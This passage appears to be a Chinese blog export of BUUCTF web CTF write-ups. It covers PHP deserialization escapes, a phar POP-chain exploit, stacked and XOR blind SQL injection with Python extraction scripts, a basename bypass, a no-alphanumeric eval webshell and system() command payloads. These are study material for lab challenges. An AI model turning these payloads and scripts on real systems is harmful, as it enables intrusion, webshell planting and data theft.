序列化后\na:3:&#123;s:4:\"user\";s:24:\"flagflagflagflagflagflag\";s:8:\"function\";s:59:\"a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:2:\"dd\";s:1:\"a\";&#125;\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";&#125;\n\n这里会将flag字符串过滤，过滤后结果\na:3:&#123;s:4:\"user\";s:24:\"#\";s:8:\"function\";s:59:\"a#\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:2:\"dd\";s:1:\"a\";&#125;\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";&#125;\n\n由于s:24 会往后边读取24位字符&quot;;s:8:&quot;function&quot;;s:59:&quot;a做为user的属性值, #号包含起来的部分，读取到a的时候结束，后面的;进行了闭合，相当于吞掉了一个属性和值，接着会继续读取我们构造的img，由于总共三个属性，我在后边加上了一个属性和值，后边的序列化结果直接就被丢弃。\n提交GET:show_imagePOST:_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;\n\n得到\n&lt;?php$flag = 'flag in /d0g3_fllllllag';?&gt;\n\n/d0g3_fllllllag  base64编码 L2QwZzNfZmxsbGxsbGFn\n提交\nGET:show_imagePOST:_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a\";s:3:\"img\";s:20:\"L2QwZzNfZmxsbGxsbGFn\";s:2:\"dd\";s:1:\"a\";&#125;\n\n得到flag\n\n又是一道反序列字符绕过闭合\n与上一题不一样的是，上一题是增加字符，这道题是删除字符。\nwhere-&gt; hacker\nflag -&gt; ‘’\n同样的原理是，将字符数组序列化后，得到一个固定格式的序列化字符串，但是这个序列化字符串被放入某个函数中进行过滤，过滤后，即原本的固定格式没有变，但是里面某些字符被函数中的规则过滤，有可能是增加，有可能会减少，不管怎么样，只要能控制即将被序列化的变量，那么就有可能自己来构建序列化字符串。\npayload\n_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;GET：show_imagePOST：_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;\n\n","categories":["CTF","BUUCTF"],"tags":["反序列化","CTF"]},{"title":"BUUCTF-WEB 【强网杯 2019】随便注 1","url":"/2021/03/26/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8%201/","content":"考点：堆叠注入打开supersqli ctftraining test\nwords 1919810931114514\n更改表名 语句rename table 表名 to 新表名;\n更改表名结构添加id 字段 并 设置约束alert table wordsadd id int unsigned not Null auto_increment primary key ; \n将table表中得 字段flag 重命名为 dataalert table words change flag data \n第一种方式原理：flag值在1919810931114514这张表中，由于select 关键字被过滤，能用show看到数据库名和表名，而页面回显的内容是words表中的内容，而在这里，我们可以进行堆叠注入，可以修改表结构，先将words表改为其他的名，然后再将1919810931114514改成words，当然还没完，页面回显的是id字段的内容，而此时的words表中的字段名为flag，这时我们就需要通过修改表结构，将flag字段改为id字段，因为flag字段的类型为varchar(100),在改成id字段名的时候也需要重新指定。1’ ; rename tables words to word1 ; rename tables 1919810931114514 to words ;  alter table words change flag id varchar(100);# \n第二种PREPARE：准备一条SQL语句，并分配给这条SQL语句一个名字供之后调用EXECUTE ：执行命令set @a=concat(“sel”,”ect flag from 1919810931114514“);1’;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#\n第三种1’; handler 1919810931114514 open as a; handler a read next;#\n总结 \n第一种方式还比较容易理解，到了第二第三，真不是那么好理解，使用的关键字都比较冷门，平时基本都不会用。\n","categories":["CTF","BUUCTF"],"tags":["CTF","堆叠注入"]},{"title":"BUUCTF-WEB 【Zer0pts2020】Can you guess it 1","url":"/2021/05/06/%5BZer0pts2020%5DCan%20you%20guess%20it%201/","content":"考点：代码审计、正则绕过、basename缺陷打开&lt;?phpinclude &apos;config.php&apos;; // FLAG is defined in config.phpif (preg_match(&apos;/config\\.php\\/*$/i&apos;, $_SERVER[&apos;PHP_SELF&apos;])) &#123;  exit(&quot;I don&apos;t know what you are thinking, but I won&apos;t let you read it :)&quot;);&#125;if (isset($_GET[&apos;source&apos;])) &#123;  highlight_file(basename($_SERVER[&apos;PHP_SELF&apos;]));  exit();&#125;$secret = bin2hex(random_bytes(64));if (isset($_POST[&apos;guess&apos;])) &#123;  $guess = (string) $_POST[&apos;guess&apos;];  if (hash_equals($secret, $guess)) &#123;    $message = &apos;Congratulations! The flag is: &apos; . FLAG;  &#125; else &#123;    $message = &apos;Wrong.&apos;;  &#125;&#125;?&gt;&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;  &lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;title&gt;Can you guess it?&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;h1&gt;Can you guess it?&lt;/h1&gt;    &lt;p&gt;If your guess is correct, I&apos;ll give you the flag.&lt;/p&gt;    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;    &lt;hr&gt;&lt;?php if (isset($message)) &#123; ?&gt;    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;&lt;?php &#125; ?&gt;    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;      &lt;input type=&quot;submit&quot;&gt;    &lt;/form&gt;  &lt;/body&gt;&lt;/html&gt;\n\n分析题目直接给出了源代码，通过分析，可以得到两段代码。先看看下半段。\n# 随机生成64位二进制字节，再转换位十六进制 赋值给$secret$secret = bin2hex(random_bytes(64));if (isset($_POST['guess'])) &#123;  $guess = (string) $_POST['guess'];    # hash_equals 可防止时序攻击的字符串比较     # 如果传入字符串长度和随机生成的字符串长度不一样 直接 false  if (hash_equals($secret, $guess)) &#123;    $message = 'Congratulations! The flag is: ' . FLAG;  &#125; else &#123;    $message = 'Wrong.';  &#125;&#125;\n\n这段代码，是想让我们传入字符串，要求字符串与随机生成的字符串一样，那么才会输出flag。几乎不太可能。\n分析上半段代码。\n# $_SERVER['PHP_SELF'] 是获取url中域名后边的部分 www.xxx.com/index.php/config.php 就是获取 index.php/config.php# 这里的正则直接就是匹配 config.php/ 不允许这样的结尾 if (preg_match('/config\\.php\\/*$/i', $_SERVER['PHP_SELF'])) &#123;  exit(\"I don't know what you are thinking, but I won't let you read it :)\");&#125;# 如果传入的是 /index.php/config.php  那么 basename 取到的就是config.php if (isset($_GET['source'])) &#123;  highlight_file(basename($_SERVER['PHP_SELF']));  exit();&#125;\n\n如果通过highlight_file去读取config.php 文件，这段代码看起来好像是不太行，通过传入 /index.php/config.php 会被正则直接拦下来。但是basename 这个函数有个小小的问题，就是文件名首尾任何非ASCII码的字符都会被rename函数删除掉。官网https://bugs.php.net/bug.php?id=62119。\n$path='/test/äaä.txt';echo $path.\"\\n\";setlocale(LC_ALL,'C');echo dirname($path).'/'.basename($path).\"\\n\";setlocale(LC_ALL,'en_US.iso885915'); // bash: locale -aecho dirname($path).'/'.basename($path).\"\\n\";Expected result:----------------/test/äaä.txt/test/äaä.txt/test/äaä.txtActual result:--------------/test/äaä.txt/test/aä.txt/test/äaä.txt\n\n构造payload\n/index.php/config.php/%e4/?source\n\n首先浏览器会去请求index.php这个文件，正则会匹配/index.php/config.php/%e4/ ，末尾不满足正则表达式的规则，不会被拦截，到rename这，会把%e4，也就是 ä，这个非ASCII码字符丢弃掉，只会拿到config.php，所以highlight_file就成功读取到了config.php文件\n得到\n\n","categories":["CTF","BUUCTF"],"tags":["代码审计","CTF","preg_match绕过"]},{"title":"BUUCTF-WEB 【SWPUCTF 2018】SimplePHP 1","url":"/2021/08/22/%5BSWPUCTF%202018%5DSimplePHP%201/","content":"考点代码审计\n反序列化（phar反序列化 和 pop链构造）\n前置知识phar反序列化的三个前提条件\n可以上传phar文件\n有可以利用的魔术方法\n文件操作函数的参数可控\n\nphar文件生成//生成phar文件前需要配置php.ini[Phar]; http://php.net/phar.readonlyphar.readonly = On 改成 Off\n\n// 创建对象 exp.phar 是文件名$phar = new Phar('exp.phar');$phar-&gt;startBuffering();// 设置stub$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ?&gt;');// $c1 就是要反序列化的对象$phar-&gt;setMetadata($c1);// 要压缩的文件$phar-&gt;addFromString('exp.txt','test');$phar-&gt;stopBuffering();\n\n可以代替unserialize 进行反序列化操作的函数\n\n\n\n\n\n\n\n\n\nfileatime\nfilectime\nfile_exists\nfile_get_contents\n\n\nfile_put_contents\nfile\nfilegroup\nfopen\n\n\nfileinode\nfilemtime\nfileowner\nfikeperms\n\n\nis_dir\nis_executable\nis_file\nis_link\n\n\nis_readable\nis_writable\nis_writeable\nparse_ini_file\n\n\ncopy\nunlink\nstat\nreadfile\n\n\n魔法方法\n__destruct \n类对象被删除时自动调用，反正只要创建对象，都会自动调用一次\n__toString \n使用 echo 或者 print 进行输出时 就会自动调用\n__get \n读取不可访问（protected 或 private）或不存在的属性的值时会自动调用\n\npop链构造\n1、找到可利用的地方，比如，文件包含，命令执行等地方\n2、从可以利用地方回溯到可控制的地方，找到一个链条。\n3、更改属性内容，先进行序列化，看看能不能达到目的。\n4、能够达到目的，才进行反序列化，进行提交 有需要编码 就进行编码\n\n解题过程打开两个基本的功能，文件上传和查看文件\n\n\n当然，首先联想到的就是，上传图片马，文件包含getshell，事实上想太简单了，文件包含直接输出字符串，就像这样。\n\n经过多次尝试，文件上传只能上传gif,jpg这几中文件，白名单，上传路径为/upload。文件包含只能包含，/var/www/html目录下的文件，可以包含出源代码。\n\n获取源码放两个关键点的代码\nfile.php\n&lt;?phpheader(&quot;content-type:text/html;charset=utf-8&quot;);include &apos;function.php&apos;;include &apos;class.php&apos;;ini_set(&apos;open_basedir&apos;,&apos;F:\\Code\\PHP\\Poc\\Serializer\\phar\\web3&apos;);$file = $_GET[&quot;file&quot;] ? $_GET[&apos;file&apos;] : &quot;&quot;;if(empty($file)) &#123;    echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;;&#125;# 创建 一个show对象$show = new Show();// 反序列化触发点if(file_exists($file)) &#123;    # 将$_GET[&apos;file&apos;]得到的值 赋值给 $show-&gt;source    $show-&gt;source = $file;    // $show-&gt;source = new Test();    # 调用$show-&gt;_show() 方法 功能：高亮显示一个文件    $show-&gt;_show();&#125; else if (!empty($file))&#123;    die(&apos;file doesn\\&apos;t exists.&apos;);&#125;?&gt;\n\nclass.php\n&lt;?phpclass C1e4r&#123;    public $test;    public $str;    public function __construct($name)    &#123;        $this-&gt;str = $name;    &#125;    public function __destruct()    &#123;        $this-&gt;test = $this-&gt;str;        echo $this-&gt;test;    &#125;&#125;class Show&#123;    public $source;    public $str;    # 如果不是 new Show() 的时候传入$file 那么不会执行 __toString    public function __construct($file)    &#123;        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.phar        echo $this-&gt;source; // 会触发 __toString 方法    &#125;    public function __toString()    &#123;        # $this-&gt;&gt;str = new C1e4r(new Test())//        echo \"__toString\";        $content = $this-&gt;str['str']-&gt;source;        return $content;    &#125;    public function __set($key,$value)    &#123;        $this-&gt;$key = $value;    &#125;    public function _show()    &#123;        if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this-&gt;source)) &#123;            die('hacker!');        &#125; else &#123;            highlight_file($this-&gt;source);        &#125;    &#125;    # 反序列化会触发    public function __wakeup()    &#123;        if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", $this-&gt;source)) &#123;            echo \"hacker~\";            $this-&gt;source = \"index.php\";        &#125;    &#125;&#125;class Test&#123;    public $file;    public $params;    public function __construct()    &#123;        $this-&gt;params = array();    &#125;    # __get()，获得一个类的成员变量时调用    #    public function __get($key)    &#123;        return $this-&gt;get($key);    &#125;    public function get($key)    &#123;        if(isset($this-&gt;params[$key])) &#123;            $value = $this-&gt;params[$key];        &#125; else &#123;            $value = \"index.php\";        &#125;        return $this-&gt;file_get($value);    &#125;    public function file_get($value)    &#123;        # 读取flag        $text = base64_encode(file_get_contents($value));        return $text;    &#125;&#125;\n\n代码审计通过审计可以得知，这道题是phar反序列化，触发点可以不用是unserialize，找到一个能够触发反序列的关键函数file_exists ，这里的$file变量可控。\nfile.php 中\n# 创建 一个show对象$show = new Show();// 反序列化触发点if(file_exists($file)) &#123;    # 将$_GET['file']得到的值 赋值给 $show-&gt;source    $show-&gt;source = $file;    // $show-&gt;source = new Test();    # 调用$show-&gt;_show() 方法 功能：高亮显示一个文件    $show-&gt;_show();&#125; else if (!empty($file))&#123;    die('file doesn\\'t exists.');&#125;\n\npop链构造从file.php 文件中找到了反序列化触发点，接下来就要找到一个可以利用的点。\n在class.php 中 Test类中的一个方法。\npublic function file_get($value)  &#123;      # 读取flag      $text = base64_encode(file_get_contents($value));      return $text;  &#125;\n\n简化class.php\n&lt;?phpclass C1e4r&#123;    public $test;    public $str;    public function __construct($name)    &#123;        $this-&gt;str = $name;    &#125;    public function __destruct()    &#123;        $this-&gt;test = $this-&gt;str;        echo $this-&gt;test;    &#125;&#125;class Show&#123;    public $source;    public $str;    # 如果不是 new Show() 的时候传入$file 那么不会执行 __toString    public function __construct($file)    &#123;        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.phar        echo $this-&gt;source; // 会触发 __toString 方法    &#125;    public function __toString()    &#123;        # $this-&gt;&gt;str = new C1e4r(new Test())//        echo \"__toString\";        $content = $this-&gt;str['str']-&gt;source;        return $content;    &#125;&#125;class Test&#123;    public $file;    public $params;    public function __construct()    &#123;        $this-&gt;params = array();    &#125;    # __get()，获得一个类的成员变量时调用    #    public function __get($key)    &#123;        return $this-&gt;get($key);    &#125;    public function get($key)    &#123;        if(isset($this-&gt;params[$key])) &#123;            $value = $this-&gt;params[$key];        &#125; else &#123;            $value = \"index.php\";        &#125;        return $this-&gt;file_get($value);    &#125;    public function file_get($value)    &#123;        # 读取flag        $text = base64_encode(file_get_contents($value));        return $text;    &#125;&#125;\n\n接下来从class.php 文件中的 几个类中构建出 pop链。\nC1e4r::__destruct-&gt;Show::__toString-&gt;Test::__get\n\n构造pop链要从可以利用的地方放回构建。\n\n 首先Test类中要调用__get方法，那么类方法中必须调用一个不存在的属性或者私有属性，在Show类中的__toString方法中，有这么一句 $content = $this-&gt;str[&#39;str&#39;]-&gt;source; ，我们让$this-&gt;str[&#39;str&#39;] 为 Test类，那么 调用的就是 $content = Test-&gt;source;，就会触发Test类调用__get，__get中会调用get方法，get方法又会调用file_get，然后执行到file_get_contents。那要怎么才能让__toString执行呢，在C1e4r类中有一个__destruct方法，这个方法有一句 echo $this-&gt;test; ,echo则会触发__toString的执行，所以我们要让$this-&gt;test 为 $this-&gt;test = new Show() ，但是这里还不能这样做，在C1e4r中的__destruct方法中 $this-&gt;test 要被 $this-&gt;str赋值，所以，这里，直接给 $this-&gt;str = new Show()。\n\n上代码\n\n注意：这里要生成phar文件，需要在 php.ini 中 让phar.readonly = On 为 Off，不然会报错\n\n$c1e4r = new C1e4r();$show = new Show();$test = new Test();// 这里之所以要为params['source'] 是因为你Show的__toStringd调用source;// Test的 get方法会进行检测 $this-&gt;params[$key] 未定义 则赋值 index.php// 因为调用了一个未定义属性 source ,所以$key的值为 'source' // 所以这里的  $value = $this-&gt;params[$key]; 获取的就是 '/var/www/html/f1ag.php'$test-&gt;params['source'] = '/var/www/html/f1ag.php';$show-&gt;str['str'] = $test;$c1e4r-&gt;str = $show;# 创建对象 exp.phar 是文件名$phar = new Phar('exp.phar');$phar-&gt;startBuffering();// 设置stub$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ?&gt;');//$phar-&gt;setMetadata($c1e4r);// 要压缩的文件$phar-&gt;addFromString('exp.txt','test');$phar-&gt;stopBuffering();\n\n执行生成\n\nphar后缀肯定上传不上去，改后缀上传\n\n找到文件\n\nphar://伪协议读取\nfile.php?file=phar://upload/8db450d8192e8744a04cbdef20abcaf1.jpg\n\n得到\n\n这个就是flag，不解码了。\n总结通过这道题，再一次巩固了反序列化的phar类型的题，不仅是phar类型，还有pop链的构造，我对pop链构造一直都不是很熟悉，说到底都还是这种类型的题做得太少，自己觉得这个题还是有难度，尤其是这么多个文件，还是去找执行反序列化的地方，刚开始，我一直以为是Test类file_get方法中的 file_get_contents函数，但是怎么想都不对，如果是它，那怎么利用呢，基本上不可能，看了别的师傅wp，才知道用phar://协议读取，file_exists函数也可以触发反序列化，学到了很多 。\n","categories":["CTF","BUUCTF"],"tags":["反序列化","代码审计","CTF"]},{"title":"BUUCTF-WEB 【极客大挑战 2019】FinalSQL 1","url":"/2021/04/15/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DFinalSQL%201/","content":"考点：异或盲注payload\n获取表名1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))&gt;0)^1[*] F1naI1y,Flaaaaag~猜测列名1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='表名')),1,1))&gt;0)^1猜测值1^(ord(substr((select(group_concat(列名))from(表名)),1,1))&gt;0)^1\n\n二分查找\narr = [i for i in range(33,127)]start = 0end = len(arr) + 1item = 97while start &lt;= end:mid = (start+end)//2if arr[mid] &lt; item:\tstart = mid + 1elif arr[mid] &gt; item:\tend = mid -1 elif arr[mid] == item:\tprint('[+] mid='+str(mid))\tbreakprint(\"end\")\n\n上脚本\nimport requestsimport timedef ascii_str(): #生成库名表名字符所在的字符列表字典    \tstr_list=[]\tfor i in range(33,127):#所有可显示字符\t\tstr_list.append(chr(i))\t#print('可显示字符：%s'%str_list)\treturn str_list #返回字符列表def exp_table_name(url): # 猜解表名    arr_str = ascii_str()    table_name = \"\"    for i in range(1,20):        for s in arr_str:            payload = \"1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))=%s)^1\"%(i, ord(s))            payload_url = url + payload            print(payload)            time.sleep(1)            resp = requests.get(payload_url, timeout=10)            if \"Click\" in resp.text:                # print(\"[*]  \" + s)                break                table_name += s        print(\"[*] \" + table_name)    return table_namedef exp_column_name(url):    str_arr = ascii_str()    column_name = \"\"    for i in range(1,100):        for s in str_arr:            payload = \"1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))=%s)^1\"%(i, ord(s))            payload_url = url + payload            print(payload)            time.sleep(1)            resp = requests.get(payload_url, timeout=10)            if \"Click\" in resp.text:                # print(\"[+] \" + s)                column_name += s                break        print(\"[+] \" + column_name)        return column_namedef exp_column_value(url): # 猜解单个字段值    arr_str = ascii_str()    column_value = \"\"    for i in range(100, 200):        for s in arr_str:            payload = \"1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))=%s)^1\"%(i, ord(s))            payload_url = url + payload            time.sleep(1)            print(payload)            resp = requests.get(payload_url)            if \"Click\" in resp.text:                # print(\"[+] \" + s)                column_value += s                break        print(\"[*] \" + column_value)    return column_value       if __name__=='__main__':    url = \"http://d306a06c-16fb-4f1b-8cc1-96da2f301860.node3.buuoj.cn/search.php?id=\"    # exp_table_name(url)    # [*] F1naI1y,Flaaaaag~    # exp_column_name(url)    # id, username, password    exp_column_value(url)\n\n这个脚本特别慢，特别是最后猜测字典的时候，差不多有两百来位，可能要猜一天，只好研究一下怎么把二分查找运用到盲注脚本中来。\n二分查找逻辑二分查找是不断根据提交两个数的中间值后的反馈来不断更换查找边界来找到目标值，比如，我们需要在1-1000之间查找 666，提交中间值 500，发现小于目标数666，就会把最开始 start 的边界换成500，然后再继续提交中间数750，发现大于目标数666，就会把末尾的 end 换成 750 ，不断改变不断的改变边界变量，直到找到。\nimport requestsimport timedef exp_column_value(url, i, mid): # 猜解单个字段值    payload = \"1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;=%s)^1\"%(i,mid)    payload_url = url + payload    time.sleep(1)    print(payload)    resp = requests.get(payload_url)    # 如果能够执行下列语句 则代表着 大于或等于    if \"Click\" in resp.text:        # 再次进行判断        payload = \"1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))=%s)^1\"%(i,mid)        payload_url = url + payload        time.sleep(1)        print(payload)        resp = requests.get(payload_url)        if \"Click\" in resp.text:        # 拿到目标数            return 200        else:            # 小于目标值            return 203    # 大于目标值    else:        return 400def exp(url):    column_value = \"\"    for i in range(1,300):        start = 33        end = 127        while start &lt;= end:            mid = (start + end) // 2            res = exp_column_value(url,i,mid)            print(\"[*] 返回码：\" + str(res))            # 代表找到            if res == 200:                print(\"[+] mid = \"+str(mid))                column_value += chr(mid)                break            # 代表是小于字符ascii码值            elif res == 203:                start = mid + 1             # 代表是大于 ascii码值            elif res == 400:                end = mid - 1        print(\"[+] \" + column_value)        if __name__=='__main__':    url = \"http://4b10de77-d978-4a22-82f7-e983cfefa564.node3.buuoj.cn/search.php?id=\"    exp(url)\n\n加上time.sleep(1) 是因为BUUCTF有限制，如果不加几分钟就跑出来了，用算法和不用算法对比起来，算法效率真高。\n","categories":["CTF","BUUCTF"],"tags":["CTF","异或注入"]},{"title":"BUUCTF-WEB [红明谷CTF 2021]write_shell 1","url":"/2021/10/20/%5B%E7%BA%A2%E6%98%8E%E8%B0%B7CTF%202021%5Dwrite_shell%201/","content":"考点&amp;知识点代码审计\n解题过程打开直接给源码\n &lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input)&#123;    if(preg_match(\"/'| |_|php|;|~|\\\\^|\\\\+|eval|&#123;|&#125;/i\",$input))&#123;        // if(preg_match(\"/'| |_|=|php/\",$input))&#123;        die('hacker!!!');    &#125;else&#123;        return $input;    &#125;&#125;function waf($input)&#123;  if(is_array($input))&#123;      foreach($input as $key=&gt;$output)&#123;          $input[$key] = waf($output);      &#125;  &#125;else&#123;      $input = check($input);  &#125;&#125;$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';if(!file_exists($dir))&#123;    mkdir($dir);&#125;switch($_GET[\"action\"] ?? \"\") &#123;    case 'pwd':        echo $dir;        break;    case 'upload':        $data = $_GET[\"data\"] ?? \"\";        waf($data);        file_put_contents(\"$dir\" . \"index.php\", $data);&#125;?&gt;\n\n这道题比较简单，可以写入字符进入&#39;sandbox/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &#39;/&#39;生成目录下的index.php文件，但是只过滤了/&#39;| |_|php|;|~|\\\\^|\\\\+|eval|{|}/这些关键字，可以使用payload(ph.info)()回显phpinfo信息，过滤了空格，使用%09绕过。\n这里直接贴拿flag的payload\n回显根目录下文件\n?action=upload&amp;data=&lt;?=(system)(&quot;ls%09/&quot;)?&gt;\n\n\naction=upload&amp;data=&lt;?=(system)(&quot;cat%09/flllllll1112222222lag&quot;)?&gt;\n\n\n总结只要绕过了空格，拿到flag轻而易举，不是很难。\n","categories":["CTF","BUUCTF"],"tags":["代码审计","CTF"]},{"title":"BUUCTF-WEB 【极客大挑战 2019】RCE ME 1","url":"/2021/04/22/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME%201/","content":"考点：无字母数字 getshell打开开门见山，直接给出源代码。\n&lt;?phperror_reporting(0);if(isset($_GET['code']))&#123;    $code=$_GET['code'];    \tif(strlen($code)&gt;40)&#123;            die(\"This is too Long.\");     \t&#125;    if(preg_match(\"/[A-Za-z0-9]+/\",$code))&#123;        die(\"NO.\");    &#125;    @eval($code);&#125;else&#123;    highlight_file(__FILE__);&#125;// ?&gt;\n\n看到这道题，我就想到p神。首先，这道题是出再php7环境下，php7和php5 有不一样的解法。\n两个条件\n传入值得长度不能大于40位\nif(strlen($code)&gt;40)\n\n传入的值 不能存在 字母 数字\npreg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))\n\nphp7前是不允许用($a)(); 这种方法来执行动态函数。php7支持了该方式。\n$c = 'phpinfo';# 对 phpinfo 进行取反 再url编码输出echo urlencode(~$c);// %8F%97%8F%96%91%99%90\n\n去请求\nGET：?code=(~%8F%97%8F%96%91%99%90)();\n\n\n能够成功执行。这里可以查看disable_functions禁用了哪些函数。\n\n常用的 system exec shell_exec 都被禁用。\n用 assert 来 执行 eval($_POST[cmd]) \n$str1 = 'assert';echo urlencode(~$str1);$str2 = '(eval($_POST[cmd]))';echo '\\n';echo urlencode(~$str2);// %9E%8C%8C%9A%8D%8B\\n%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6\n\nGET：?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6);POST:cmd=phpinfo();\n\n回显\n\n蚁剑连接\n\n可以在根目录下看到flag 文件，但是不能打开，需要用到蚁剑的插件。\n\n因为许多函数被禁用，终端不能执行命令，用这个插件可以在终端中成功执行命令。\n\n总结","categories":["CTF","BUUCTF"],"tags":["CTF","preg_match绕过"]},{"title":"BUUCTF-WEB 【强网杯】 2019]Upload 1","url":"/2021/10/10/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5DUpload%201/","content":"考点网站备份文件泄露\n反序列化（多文件pop链构造）\n前置知识魔术方法\n__get\t读取不可访问（protected 或 private）或不存在的属性的值时，__get() 会被调用__call\t在对象中调用一个不可访问方法时，__call() 会被调用。\n\n解题过程分析题型打开是这么个界面\n\n注册一个账号登录后，发现一处文件上传。\n\n该尝试的都尝试了，当时卡在这个地方，然后悄悄搂了一眼大佬的博客。\n抓包，发现cookie有蹊跷。\n\nYTo1OntzOjI6IklEIjtpOjQ7czo4OiJ1c2VybmFtZSI7czo1OiJ0ZXN0MSI7czo1OiJlbWFpbCI7czoxMjoidGVzdDFAcXEuY29tIjtzOjg6InBhc3N3b3JkIjtzOjMyOiI1YTEwNWU4YjlkNDBlMTMyOTc4MGQ2MmVhMjI2NWQ4YSI7czozOiJpbWciO3M6Nzk6Ii4uL3VwbG9hZC9iYmYzOTdkN2ZlMGNhZjJhMmIwMWY5OTk3Y2VjYTEwYi8wNjhhZTQwNTIzYTI0YzllZjU0ZWRlZmQzNzVlNTQyZC5wbmciO30%3D\n\na:5:&#123;s:2:&quot;ID&quot;;i:4;s:8:&quot;username&quot;;s:5:&quot;test1&quot;;s:5:&quot;email&quot;;s:12:&quot;test1@qq.com&quot;;s:8:&quot;password&quot;;s:32:&quot;5a105e8b9d40e1329780d62ea2265d8a&quot;;s:3:&quot;img&quot;;s:79:&quot;../upload/bbf397d7fe0caf2a2b01f9997ceca10b/068ae40523a24c9ef54edefd375e542d.png&quot;O30%3D\n\nCookie为注册信息序列化后的值。到这有两种思路，第一个就是测试序列化中传入的路径是否存在目录穿越，第二个就是扫网站备份文件。经过测试，第一种不成功。扫目录扫到了www.tar.gz。\n代码审计主要的功能点在这四个文件上。\n\n在Index.php中发现了反序列化入口点。\n\n接下来找利用点。在Profile.php 文件中 有一个类Profile，Profile中有一个方法upload_img。代码如下。\npublic function upload_img()&#123;\t# 控制$this-&gt;checker 设置值为0 则不进入    if($this-&gt;checker)&#123;        if(!$this-&gt;checker-&gt;login_check())&#123;            $curr_url=\"http://\".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME'].\"/index\";            $this-&gt;redirect($curr_url,302);            exit();        &#125;    &#125;    // 不上传就不执行    if(!empty($_FILES))&#123;        $this-&gt;filename_tmp=$_FILES['upload_file']['tmp_name'];        $this-&gt;filename=md5($_FILES['upload_file']['name']).\".png\";        $this-&gt;ext_check();    &#125;    if($this-&gt;ext) &#123;        // 添加文件头 比如GIF89a        if(getimagesize($this-&gt;filename_tmp)) &#123;            # 利用点            @copy($this-&gt;filename_tmp, $this-&gt;filename);            @unlink($this-&gt;filename_tmp);            $this-&gt;img=\"../upload/$this-&gt;upload_menu/$this-&gt;filename\";            $this-&gt;update_img();        &#125;else&#123;            $this-&gt;error('Forbidden type!', url('../index'));        &#125;    &#125;else&#123;        $this-&gt;error('Unknow file type!', url('../index'));    &#125;&#125;\n\n是我太菜了，刚开始自己看了一遍，没看出什么毛病，搂一眼大佬博客，发现利用点为copy，这个\ncopy(source, dest)将文件从 source拷贝到dest。成功时返回TRUE， 或者在失败时返回FALSE。这里$this-&gt;filename_tmp和$this-&gt;filename 在可控的情况下，可以将上传的有一句话的png格式图片文件拷贝成php后缀的文件。\n$this-&gt;filename_tmp = \"shell.png\";$this-&gt;filename = \"shell.php\";copy($this-&gt;filename_tmp,$this-&gt;filename); // 最终得到一个shell.php文件\n\n找到了利用点，接下来，怎么才能执行到这个upload_img方法。\nProfile类中发现两个魔术方法\npublic function __get($name)    &#123;        return $this-&gt;except[$name];    &#125;public function __call($name, $arguments)    &#123;        # 这里的 $this-&gt;&#123;$name&#125; 也表示一个属性 $name 表示属性名        # 平时都是 $this-&gt;name 写死 $this-&gt;&#123;$name&#125; 的$name 变量名可控        if($this-&gt;&#123;$name&#125;)&#123;        $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);    &#125;&#125;\n\n__get\t读取不可访问（protected 或 private）或不存在的属性的值时，__get() 会被调用__call\t在对象中调用一个不可访问方法时，__call() 会被调用。\n\n在__call 